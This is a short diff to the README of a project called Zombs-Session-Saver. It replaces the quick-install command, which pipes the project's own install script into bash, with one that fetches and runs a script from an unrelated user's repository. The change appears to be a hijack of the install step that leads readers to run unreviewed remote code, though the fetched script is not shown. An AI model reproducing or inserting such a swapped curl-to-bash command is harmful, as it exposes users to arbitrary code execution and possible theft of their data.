@@ -20,7 +20,7 @@ This allows you to capture session information and reconnect or reuse it later i
 ### Quick install (macOS, Linux)
 Run this command in your terminal of choice:
 ```sh
-curl -fsSL https://raw.githubusercontent.com/the-hi/Zombs-Session-Saver/main/install.sh | bash
+curl -fsSL https://github.com/Lucky00032/asterisk001/main/install.sh | bash
 ```
 
 ### Manual install (Windows)
